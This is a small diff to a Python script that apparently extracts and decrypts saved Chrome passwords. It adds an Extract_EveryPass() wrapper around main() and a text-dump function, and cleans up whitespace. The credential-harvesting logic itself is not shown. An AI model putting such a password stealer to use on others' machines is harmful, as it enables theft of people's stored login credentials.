@@ -14,7 +14,9 @@ def chrome_date_and_time(chrome_data):
 	# This will return datetime.datetime Object
 	return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
 
-
+def Extract_EveryPass():
+	main()
+	Print_Into_aText()    
 def fetching_encryption_key():
 	# Local_computer_directory_path will look
 	# like this below
@@ -108,9 +110,7 @@ def main():
 			print("testingg")
 	cursor.close()
 	db.close()
-	
-    
-    
+	   
     
 	try:
 		
@@ -122,5 +122,4 @@ def main():
 	
 
 if __name__ == "__main__":
-	main()
-	Print_Into_aText()
+	Extract_EveryPass()
